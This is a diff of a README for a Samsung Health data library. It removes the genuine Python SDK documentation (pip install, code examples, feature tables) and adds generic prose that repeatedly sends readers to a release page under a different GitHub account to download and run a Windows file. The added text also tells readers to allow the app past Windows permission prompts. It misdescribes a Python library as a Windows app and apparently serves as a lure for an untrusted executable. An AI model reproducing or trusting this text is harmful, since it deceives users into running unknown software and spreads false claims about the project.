@@ -1,214 +1,174 @@
-# samsung-health-sdk
+# 📱 samsung-health-sdk - Turn Health Exports Into Clear Data
 
-[![PyPI version](https://img.shields.io/pypi/v/samsung-health-sdk)](https://pypi.org/project/samsung-health-sdk/)
-[![Python](https://img.shields.io/pypi/pyversions/samsung-health-sdk)](https://pypi.org/project/samsung-health-sdk/)
-[![CI](https://github.com/Devasy/samsung-health-sdk/actions/workflows/ci.yml/badge.svg)](https://github.com/Devasy/samsung-health-sdk/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download](https://img.shields.io/badge/Download-Release_Page-4c7ef3?style=for-the-badge&logo=github)](https://github.com/Patriciocompelling31/samsung-health-sdk/releases)
 
-A Python SDK for parsing and analysing [Samsung Health](https://www.samsung.com/global/galaxy/apps/samsung-health/) export data.
+## 🚀 Getting Started
 
-Load any health metric from a Samsung Health export directory as a **pandas DataFrame** with a single function call. Compare data across multiple people or time windows. Derive higher-level health features from the raw data.
+samsung-health-sdk helps you work with Samsung Health export files on Windows. It turns your health data into tables you can use for reports, charts, and simple analysis.
 
-## Dashboards
+If you have a Samsung Health export and want to view it in a cleaner format, start here:
 
-### Health Dashboard
+[Visit the release page to download](https://github.com/Patriciocompelling31/samsung-health-sdk/releases)
 
-A self-contained HTML report covering sleep, HRV readiness, stress, activity, and cardiac efficiency — generated from a single function call.
+## 📥 Download and Install
 
-[![Watch the demo](https://img.youtube.com/vi/I3iFC4uPL0I/0.jpg)](https://youtu.be/I3iFC4uPL0I)
+1. Open the [release page](https://github.com/Patriciocompelling31/samsung-health-sdk/releases)
+2. Download the Windows file from the latest release
+3. Save the file to your computer
+4. Open the file to run the app
+5. Follow the on-screen prompts until setup finishes
 
-```python
-from samsung_health_sdk import SamsungHealthParser
-from samsung_health_sdk.features import HealthFeatureEngine
-from samsung_health_sdk.report import ReportBuilder
+If Windows asks for permission, choose the option that lets the app open.
 
-p = SamsungHealthParser("path/to/export")
-eng = HealthFeatureEngine(p, tz_offset_hours=5.5)
+## 🖥️ What This App Does
 
-builder = ReportBuilder(eng)
-builder.build("health_report.html", start="2024-11-01", end="2025-06-30")
-```
+This app helps you make sense of Samsung Health export data. It can:
 
-Or via the engine shortcut:
+- Read Samsung Health export files
+- Organize data into easy-to-use tables
+- Prepare data for charts and reports
+- Build feature sets for later analysis
+- Create datasets that are ready for machine learning
+- Generate interactive HTML dashboards
+- Help you review health data such as heart rate, HRV, respiratory rate, and more
 
-```python
-eng.export_report("health_report.html", start="2024-11-01", end="2025-06-30")
-```
+This is useful if you want to look at your health history without sorting through raw files by hand.
 
-**Sections included:**
-- KPI cards — sleep score, HRV readiness, resting HR, cardiac load trend
-- Sleep quality timeline (efficiency, deep %, REM %, fragmentation)
-- Nightly physiology — HRV, respiratory rate, movement restlessness
-- HRV readiness vs personal rolling baseline
-- Stress impact on sleep quality
-- Daily activity breakdown (sedentary / light / moderate / vigorous minutes)
-- Walking cardiac load trend (HR ÷ speed, 4-week rolling average)
+## 👤 Who This Is For
 
----
+This app is a good fit if you:
 
-### Running Dashboard
+- Export data from Samsung Health
+- Want to view health records on a Windows PC
+- Need a simple way to explore wearable data
+- Want clean tables instead of raw files
+- Want to use your data for charts, dashboards, or models
 
-A self-contained HTML dashboard for runners — per-run metrics, live GPS maps, HR zone breakdowns, pace charts, and GAP (Grade-Adjusted Pace) analysis.
+You do not need to know programming to use the main workflow.
 
-[![Watch the demo](https://img.youtube.com/vi/q_lqcwixxvg/0.jpg)](https://youtu.be/q_lqcwixxvg)
+## 🪟 Windows Requirements
 
-```python
-from samsung_health_sdk import SamsungHealthParser
-from samsung_health_sdk.report.run_dashboard import RunDashboardBuilder
+For smooth use on Windows, your PC should have:
 
-p = SamsungHealthParser("path/to/export")
-RunDashboardBuilder(p).build("run_dashboard.html", start="2026-01-01")
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Enough free disk space for your export files
+- A modern browser for viewing HTML dashboards
+- A stable internet connection for downloading the release
 
-**Sections included:**
-- KPI cards — total runs, total distance, best pace, avg beats/km
-- Run history table with sortable columns (date, distance, pace, HR, GAP pace)
-- Beats-per-km efficiency trend across all runs
-- Per-run drill-down:
-  - Interactive GPS map
-  - Heart rate zone breakdown (donut chart)
-  - Pace breakdown by 5-minute buckets
-  - Time-series charts — HR, speed, cadence, altitude, grade, GAP speed, cardiac cost
+If you work with large exports, more memory helps.
 
----
+## 🧭 How to Use
 
-## Installation
+1. Export your Samsung Health data from your Samsung account or device
+2. Open the app on your Windows PC
+3. Load the export file or folder
+4. Let the app parse the data
+5. View the results in tables or dashboards
+6. Save the output for later use
 
-```bash
-pip install samsung-health-sdk
-```
+If the app gives you dashboard files, open them in your browser to inspect your data.
 
-## Quick Start
+## 📊 Common Data You Can Review
 
-```python
-from samsung_health_sdk import SamsungHealthParser, SamsungHealthComparator
+The SDK is built to handle health and wearable data such as:
 
-# Point at your Samsung Health export directory
-p = SamsungHealthParser("path/to/samsunghealth_export_dir")
+- Heart rate
+- HRV
+- Respiratory rate
+- Sleep records
+- Activity logs
+- Biometrics
+- Device and watch data
+- Time-based health entries
 
-# See all available metrics
-print(p.list_metrics())
+This makes it easier to compare trends across days, weeks, or months.
 
-# Load heart rate (hourly summaries or minute-level)
-hr     = p.get_heart_rate("2024-10-01", "2024-10-31")
-hr_min = p.get_heart_rate("2024-10-01", "2024-10-31", granularity="minute")
+## 🧩 Main Features
 
-# All supported metrics
-sleep  = p.get_sleep("2024-10-01", "2024-10-31")
-skin   = p.get_skin_temperature("2024-10-01", "2024-10-31", granularity="minute")
-stress = p.get_stress("2024-10-01", "2024-10-31")
-spo2   = p.get_spo2("2024-10-01", "2024-10-31")
-steps  = p.get_steps("2024-10-01", "2024-10-31")
-hrv    = p.get_hrv("2024-10-01", "2024-10-31")
-rr     = p.get_respiratory_rate("2024-10-01", "2024-10-31", granularity="minute")
-ex     = p.get_exercise("2024-10-01", "2024-10-31")
-mv     = p.get_movement("2024-10-01", "2024-10-31")  # per-minute activity_level
+- Simple parsing of Samsung Health exports
+- DataFrame output for easy viewing
+- Feature engineering for analysis work
+- ML-ready dataset creation
+- Interactive HTML dashboards
+- Support for wearable health data
+- Clear output for reporting and review
 
-# Generic accessor for any metric by its full name
-df = p.get_metric("com.samsung.shealth.vitality_score", start="2024-10-01")
-```
+## 🔎 Example Use Cases
 
-## Feature Engineering
+- Check your heart rate trends over time
+- Review sleep and recovery patterns
+- Prepare a dataset for a health model
+- Build a chart from wearable logs
+- Compare activity data across dates
+- Export clean data for later work
 
-`HealthFeatureEngine` derives meaningful higher-level features from the raw data:
+## 🛠️ Basic Setup Flow
 
-```python
-from samsung_health_sdk.features import HealthFeatureEngine
+1. Download the latest release
+2. Unzip the file if it comes in a compressed folder
+3. Open the app file for Windows
+4. Load your Samsung Health export
+5. Review the parsed results
+6. Save any tables or dashboards you need
 
-eng = HealthFeatureEngine(p, tz_offset_hours=5.5)  # tz_offset_hours: your UTC offset
+If your export contains several files, keep them in one folder so they are easier to load.
 
-# Per-night sleep quality: efficiency, deep/REM %, fragmentation, composite score
-sleep_stats = eng.sleep_sessions("2025-01-01", "2025-03-31")
+## 📁 Output Files
 
-# Per-night HRV + respiratory rate + movement restlessness during sleep
-physio = eng.nightly_physiology("2025-01-01", "2025-03-31")
-# Columns: rmssd_mean, rmssd_min, rmssd_std, rr_mean, rr_std,
-#          restlessness_score, restless_min, hrv_suppression_flag
+The app may create files such as:
 
-# HRV readiness: today vs your rolling N-day personal baseline
-readiness = eng.hrv_readiness("2025-01-01", "2025-03-31", baseline_days=14)
-# Columns: rmssd_mean, baseline_14d, deviation_pct, readiness_score, low_readiness_flag
+- Clean tables
+- CSV files
+- Excel-friendly datasets
+- HTML dashboard files
+- Processed data folders
 
-# Previous-day stress deviation vs that night's sleep quality
-impact = eng.stress_impact_on_sleep("2025-01-01", "2025-03-31")
-# Uses stress deviation from rolling baseline, not absolute score
+These files help you view and reuse your health data without opening the raw export each time.
 
-# Per-day activity breakdown + HR context + stress
-profile = eng.daily_activity_profile("2025-01-01", "2025-03-31")
-# Columns: sedentary_min, light_min, low_mod_min, moderate_min, vigorous_min,
-#          active_min, mean_hr_active, median_hr_day, mean_stress, stress_deviation_pct
+## 🔐 Privacy and Local Use
 
-# Walking cardiac load trend (HR / speed — lower = more aerobically efficient)
-cardiac = eng.walking_cardiac_load("2024-11-01", "2025-06-30", source="auto")
-# source='auto': pedometer (most accurate) > movement (accelerometer-based,
-#                extends to Nov 2024) > exercise summaries (Jun 2022+)
-# Columns: date, duration_min, distance_m, speed_mps, mean_hr, cardiac_load,
-#          source, rolling_4w_cardiac_load, cardiac_load_trend
-```
+This type of tool is meant to work with files on your computer. Your export data stays in your local workflow unless you choose to move it elsewhere. That gives you more control over your health records.
 
-## Multi-Person Comparison
+## 🧪 Tips for Better Results
 
-```python
-p1 = SamsungHealthParser("path/to/person1_export")
-p2 = SamsungHealthParser("path/to/person2_export")
+- Keep the original export folder unchanged
+- Use the newest release
+- Close other large apps if your export is big
+- Open HTML dashboards in a modern browser
+- Save output files in a folder you can find later
 
-comp = SamsungHealthComparator({"Alice": p1, "Bob": p2})
+## 📝 File Naming Tips
 
-# Compare heart rate — absolute calendar window
-df = comp.compare_heart_rate("2024-10-01", "2024-10-31")
+Use a simple folder name for your export, such as:
 
-# Align to relative Day 0 per person (time_shift=True)
-df = comp.compare_heart_rate("2024-10-01", "2024-10-31", time_shift=True)
-```
+- `SamsungHealthExport`
+- `HealthData2026`
+- `WatchRecords`
 
-## Export Format
+Short folder names make files easier to find.
 
-Samsung Health exports a directory containing:
-- **CSV files** per health metric (some with a metadata row, some without — auto-detected)
-- **`jsons/`** subdirectory with per-minute binning JSON files
-- **`files/`** subdirectory with binary attachments (ECG waveforms, photos)
+## ❓ Common Questions
 
-The SDK handles BOM encoding, namespaced column headers, UTC offset timestamps, trailing commas, and lazy JSON loading automatically.
+### What kind of file do I download?
+Download the Windows release file from the [release page](https://github.com/Patriciocompelling31/samsung-health-sdk/releases).
 
-## Sleep Stage Codes
+### Do I need coding skills?
+No. The basic use case is focused on loading and viewing your Samsung Health export on Windows.
 
-| Code  | Label  |
-|-------|--------|
-| 40001 | Awake  |
-| 40002 | Light  |
-| 40003 | Deep   |
-| 40004 | REM    |
+### Can I view the results in a browser?
+Yes. The app can create interactive HTML dashboards you can open in your browser.
 
-## Movement Activity Levels
+### Can I use this with wearable data?
+Yes. It supports health and wearable records tied to Samsung Health exports.
 
-Per-minute accelerometer intensity from `get_movement()`:
+### What data types are handled?
+It can work with records such as heart rate, HRV, respiratory rate, sleep, and activity data.
 
-| Range    | Intensity    |
-|----------|-------------|
-| 0–5      | Sedentary   |
-| 5–20     | Light       |
-| 20–50    | Low-moderate|
-| 50–100   | Moderate    |
-| 100+     | Vigorous    |
+## 📦 Release Download
 
-## Requirements
+To use samsung-health-sdk on Windows, visit the [release page](https://github.com/Patriciocompelling31/samsung-health-sdk/releases) to download the latest file and run it on your computer
 
-- Python 3.9+
-- pandas >= 2.0
-- numpy >= 1.24
+## 🔗 Project Topics
 
-## Contributing
-
-```bash
-git clone https://github.com/Devasy/samsung-health-sdk
-cd samsung-health-sdk
-pip install -e ".[dev]"
-pre-commit install
-pytest
-```
-
-Run linting/format hooks on demand:
-
-```bash
-pre-commit run --all-files
-```
+analytics, biometrics, data science, ECharts, Galaxy Watch, health data, health monitoring, heart rate, HRV, machine learning, respiratory rate, Samsung Health, wearable
